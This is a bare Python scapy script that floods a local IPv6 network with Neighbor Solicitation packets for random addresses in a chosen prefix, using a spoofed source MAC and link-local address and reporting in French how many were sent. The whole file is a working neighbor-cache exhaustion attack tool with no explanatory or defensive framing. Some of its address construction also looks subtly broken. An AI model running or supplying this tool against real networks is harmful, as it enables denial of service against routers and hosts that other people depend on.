#!/usr/bin/env python3
from sys import prefix
import argparse, random, time
from scapy.all import Ether, IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, sendp
def random_target(prefix):
    suffix = ":".join(f"{random.randint(0, 0xffff):x}" for _ in range(4))
    return f"{prefix.rstrip(':')}:{suffix}"
def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", required=True)
    p.add_argument("--prefix", required=True)
    p.add_argument("--src-mac", default="02:00:00:00:00:dd")
    p.add_argument("--src-ip", default="fe80::dead:beef")
    p.add_argument("--count", type=int, default=5000)
    p.add_argument("--rate", type=int, default=200)
    args = p.parse_args()
    delay = 1.0 / args.rate if args.rate > 0 else 0
    sent = 0
    t0 = time.time()
    for _ in range(args.count):
        tgt = random_target(args.prefix)
        pkt = (Ether(src=args.src_mac, dst="33:33:ff:00:00:00") /
            IPv6(src=args.src_ip, dst=f"ff02::1:ff{tgt[-7:]}") /
            ICMPv6ND_NS(tgt=tgt) /
            ICMPv6NDOptSrcLLAddr(lladdr=args.src_mac))
        sendp(pkt, iface=args.iface, verbose=False)
        sent += 1
        if delay: time.sleep(delay)
    elapsed = time.time() - t0
    print(f"{sent} NS envoyés en {elapsed:.1f}s")
if __name__ == "__main__":
    main()
